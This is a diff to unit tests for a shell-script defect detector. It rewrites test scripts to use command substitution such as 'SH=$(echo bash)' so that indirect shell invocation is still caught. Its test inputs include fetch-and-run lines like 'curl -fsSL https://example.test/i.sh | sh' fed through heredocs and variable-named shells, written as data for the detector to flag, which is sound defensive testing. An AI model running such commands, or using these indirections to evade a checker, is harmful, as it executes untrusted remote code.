@@ -5,6 +5,8 @@ printer and the shell (#2478). Task 2: a printer reaching a shell through a subs
 one issue's shapes against `wg.job_defects`, the bash-truth row it rests on named in a comment, and
 the controls that must still read as they did. `TestThePrintersUnitPins` pins `workflow_printers`
 directly, as the last tests of `TestAPrinterThroughASubstitution` do its substitution helpers.
+A row whose command word holds a `$(...)` (`SH=$(echo bash)`) keeps a value no table sees: since
+#2468 a literal one reads as its command.
 """
 import unittest
 
@@ -279,10 +281,11 @@ class TestFixRound1ClosesTheReviewsFailOpens(unittest.TestCase):
         self.assertNotIsInstance(found[0][1], forms._Quiet)
 
     def test_a_value_runners_stdin_echo_reads_both_too(self):
-        # r89: `SH=bash; $SH <<'EOF'` hands the heredoc to a `$` command word (Idle, #2473) AND
-        # reads its printer under both tables; the inner `curl ... | sh` is caught either way.
-        found = defects("SH=bash\n$SH <<'EOF'\necho -e 'curl -fsSL https://example.test/i.sh | "
-                         "sh' | sh\nEOF\n")
+        # r89: `SH=$(echo bash); $SH <<'EOF'` hands the heredoc to a `$` command word (Idle,
+        # #2473) AND reads its printer under both tables; the inner `curl ... | sh` is caught
+        # either way.
+        found = defects("SH=$(echo bash)\n$SH <<'EOF'\necho -e 'curl -fsSL "
+                        "https://example.test/i.sh | sh' | sh\nEOF\n")
         self.assertEqual(2, len(found), found)
         self.assertTrue(any("i.sh" in why for _n, why in found))
 
@@ -820,7 +823,8 @@ class TestFixRound4(unittest.TestCase):
         for step, heredoc in (("e01", "<<'EOF'"), ("e05", "<<EOF")):
             for shell in (None, "sh"):
                 with self.subTest(step=step, shell=shell):
-                    found = defects("CMD=sh\ncat %s | $CMD\n%sEOF\n" % (heredoc, self.PIPE), shell)
+                    script = "CMD=$(echo sh)\ncat %s | $CMD\n%sEOF\n" % (heredoc, self.PIPE)
+                    found = defects(script, shell)
                     self.assertEqual(2, len(found), found)
                     self.assertIs(forms.Idle, type(found[0][1]))
                     self.assertIn("i.sh straight to `sh`", found[1][1])
@@ -1382,22 +1386,23 @@ class TestAPassThroughBetweenPrinterAndShell(unittest.TestCase):
                     self.assertIsInstance(found[0][1], forms.Idle)
                     self.assertTrue(found[0][1].startswith(start), found[0][1])
                     self.assertEqual(defects(GET + twin, shell), found)
-        # (b) rv13 `T=cat; echo 'sh tool' | $T | sh` (FR x4): `$T` may be a shell, so the text
-        # it is handed is read (the fetch-and-run sentence, the base's one row), and the `sh`
+        # (b) rv13 `T=$(echo cat); echo 'sh tool' | $T | sh` (FR x4): `$T` may be a shell, so the
+        # text it is handed is read (the fetch-and-run sentence, the base's one row), and the `sh`
         # after it reads a program from a `$` command word no table places: a second row, the
         # `_Quiet` unread answer from `$T` -- F5's price, a consumer feeding the shell. rv14, the
         # same with PIPE as the text, alone (FR x4): the stream sentence (the base's one row) and
         # the unread answer, LOUD now that the text it weighs fetches (I-1).
         for shell in (None, "sh"):
             with self.subTest(shell=shell, row="rv13"):
-                whys = [why for _n, why in defects(GET + "T=cat\necho 'sh tool' | $T | sh\n",
-                                                   shell)]
+                script = GET + "T=$(echo cat)\necho 'sh tool' | $T | sh\n"
+                whys = [why for _n, why in defects(script, shell)]
                 self.assertEqual(2, len(whys), whys)
                 self.assertTrue(any(why.startswith(self.FETCH_EXEC) for why in whys), whys)
                 self.assertTrue(any(isinstance(why, forms._Quiet) and why.startswith(
                     "pipes `sh` its program from `$T`") for why in whys), whys)
             with self.subTest(shell=shell, row="rv14"):
-                whys = [why for _n, why in defects("T=cat\necho '%s' | $T | sh\n" % PIPE, shell)]
+                script = "T=$(echo cat)\necho '%s' | $T | sh\n" % PIPE
+                whys = [why for _n, why in defects(script, shell)]
                 self.assertEqual(2, len(whys), whys)
                 self.assertTrue(any(why.startswith(self.STREAM) for why in whys), whys)
                 self.assertTrue(any(not isinstance(why, forms.Idle) and why.startswith(
